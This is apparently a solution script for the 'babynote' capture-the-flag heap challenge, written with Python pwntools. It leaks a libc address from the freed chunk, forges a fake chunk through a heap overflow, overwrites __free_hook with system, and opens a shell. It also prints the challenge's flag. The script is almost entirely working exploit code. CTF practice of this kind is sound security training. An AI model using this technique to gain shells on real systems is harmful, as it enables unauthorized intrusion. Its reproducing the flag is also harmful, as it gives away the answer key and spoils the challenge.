from pwn import *
r = remote('edu-ctf.zoolab.org', 10007)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

def add_note(idx, name):
    global r
    r.sendlineafter('> ', b'1')
    r.sendlineafter("index\n> ", str(idx).encode())
    r.sendlineafter("note name\n> ", name)
    print("Add", r.recvuntil("success!\n"))

def edit_data(idx, size, data):
    global r
    r.sendlineafter('> ', b'2')
    r.sendlineafter("index\n> ", str(idx).encode())
    r.sendlineafter("size\n> ", str(size).encode())
    r.sendline(data)
    print("Edit", idx, ":" ,r.recvuntil("success!\n"))

def del_note(idx):
    global r
    r.sendlineafter('> ', b'3')
    r.sendlineafter("index\n> ", str(idx).encode())
    print("Delete", r.recvuntil("success!\n"))

def show_notes():
    global r
    r.sendlineafter('> ', b'4')
    all_notes = r.recvuntil("1. add_note\n")
    return all_notes

add_note(0, b'A' * 0x10)
edit_data(0, 0x418, b'A')

add_note(1, b'B' * 0x10)
edit_data(1, 0x18, b'B')

add_note(2, b'C' * 0xF + b'\x00')
show_notes()

del_note(0)

all_notes = show_notes()
all_notes = all_notes.split(b'\n')

# remote
main_arena_offset = 0x1ecbe0
system_offset = 0x52290
free_hook_offset = 0x1eee48

free_main = 0x22c8
system_main = 0x19a8f0


libc = u64(all_notes[1][6:].ljust(8, b'\x00')) - main_arena_offset
system = libc + system_offset
free_hook = libc + free_hook_offset

# main_arena = u64(all_notes[1][6:].ljust(8, b'\x00'))
# system = main_arena - system_main
# free_hook = main_arena + free_main

# data = b'/bin/sh\x00'.ljust(0x10, b'B')
fake_chunk = flat(
    b'/bin/sh\x00', b'BBBBBBBB'
    b'BBBBBBBB', 0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook
)

print(f"libc: {hex(libc)}")
print(f"Free hook: {hex(free_hook)}")
print(f"System: {hex(system)}")

edit_data(1, 0x38, fake_chunk)
edit_data(2, 0x8, p64(system))

r.interactive()
# manually delete index 1
# cat /home/chal/flag
# FLAG{babynote^_^_de9187eb6f3cbc1dce465601015f2ca0}